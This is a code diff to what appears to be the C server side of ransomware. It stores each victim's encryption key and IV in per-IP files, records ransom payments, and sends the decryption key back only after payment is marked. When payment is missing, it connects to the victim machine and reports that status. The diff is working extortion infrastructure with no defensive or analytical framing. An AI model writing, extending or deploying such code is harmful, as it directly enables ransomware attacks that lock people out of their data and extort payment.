@@ -19,6 +19,8 @@ void send_key(char *pKey, char *pIv,char *targetIP);
 void writeInFile(char *pKey, char *pIv,char *targetIP);
 void readFile(char *pKey, char *pIv,char *targetIP);
 int changePaymentStatus(char *targetIP);
+int checkPaymentStatus(char *targetIP);
+void paymentStatus(char action, char *targetIP);
 
 // ============================== MAIN function ==============================
 
@@ -27,6 +29,7 @@ int main(){
 	char *pKey, *pIv;
 	pKey = calloc((SIZEKEY*2)+1,sizeof(unsigned char));
 	pIv = calloc((SIZEIV*2)+1,sizeof(unsigned char));
+	mkdir("database", S_IRWXU);
 
 	int sockid;
 	int server_port = 2220;
@@ -61,7 +64,7 @@ int main(){
 		}
 		
 		len = sizeof(client_addr);
-		client_socket = accept(sockid,(struct sockaddr *)&client_addr,&len);
+		client_socket = accept(sockid,(struct sockaddr *)&client_addr,(unsigned int *)&len);
 	
 		if(client_socket<0){
 			printf("Error during accept\n");
@@ -71,7 +74,7 @@ int main(){
 			printf("[+] Accepted connection from %d %s:%d\n",client_socket,inet_ntoa(client_addr.sin_addr),client_addr.sin_port);
 		}	
 		
-		length_msg = recv(client_socket,buffer,1024,MSG_WAITALL);
+		recv(client_socket,buffer,1024,MSG_WAITALL);
 
 		char action = receive_data(pKey,pIv,buffer);
 		close(sockid);
@@ -84,7 +87,14 @@ int main(){
 			writeInFile(pKey,pIv,inet_ntoa(client_addr.sin_addr));
 		}
 		else if(action=='R'){
-			send_key(pKey,pIv,inet_ntoa(client_addr.sin_addr));
+			
+			if(checkPaymentStatus(inet_ntoa(client_addr.sin_addr))==1){
+				send_key(pKey,pIv,inet_ntoa(client_addr.sin_addr));
+			}
+			else{
+				printf(">> [$] The payment has not yet been settled for %s\n",inet_ntoa(client_addr.sin_addr));
+				paymentStatus('N',inet_ntoa(client_addr.sin_addr));
+			}
 		}
 		else if(action=='P'){
 			changePaymentStatus(inet_ntoa(client_addr.sin_addr));
@@ -110,7 +120,7 @@ char receive_data(char *pKey, char *pIv,char *buffer){
 void writeInFile(char *pKey, char *pIv,char *targetIP){
 
 	char namefile[1024];
-    mkdir("database", S_IRWXU);
+    //mkdir("database", S_IRWXU);
 	sprintf(namefile,"database/data_%s.secret",targetIP);
 	
 	FILE *file = fopen(namefile,"wb");
@@ -176,7 +186,7 @@ void send_key(char *pKey, char *pIv,char *targetIP){
 
 	send(sockid,(const char *)buffer,strlen(buffer),0);
 
-	sleep(20);
+	sleep(2);
 	close(sockid);
 }
 
@@ -206,11 +216,54 @@ int changePaymentStatus(char *targetIP){
 	while ((ch = fgetc(source)) != EOF)
 		fputc(ch, target);
 
-	printf("[$] Accepted payment from %s\n",targetIP);
+	printf(">> [$] Accepted payment from %s\n",targetIP);
 
 	fclose(source);
 	fclose(target);
 	remove(source_file);
 
 	return 0;
+}
+
+int checkPaymentStatus(char *targetIP){
+
+	char namefile[1024];
+	sprintf(namefile,"database/data_%s.secret.PAID",targetIP);
+	
+    if(access(namefile, F_OK ) != -1){
+		return 1;
+    }
+    else{
+		return 0;
+    }
+}
+void paymentStatus(char action, char *targetIP){
+	
+	int sockid = socket(AF_INET,SOCK_STREAM,0);
+
+	struct sockaddr_in victim_addr;
+	victim_addr.sin_family = AF_INET;
+	victim_addr.sin_port = htons(2220);
+	victim_addr.sin_addr.s_addr = inet_addr(targetIP);
+	
+	int success = 0;
+	int rc;
+	while(success<=10){
+		rc = connect(sockid,(struct sockaddr *)&victim_addr,sizeof(victim_addr));
+		
+		if(rc==0){
+			success = 11;
+		}
+		else{
+			success++;
+			sleep(2);
+		}
+	}
+	char *buffer = calloc(1024,sizeof(char));
+	buffer[0] = action;
+
+	send(sockid,(const char *)buffer,strlen(buffer),0);
+
+	sleep(2);
+	close(sockid);
 }
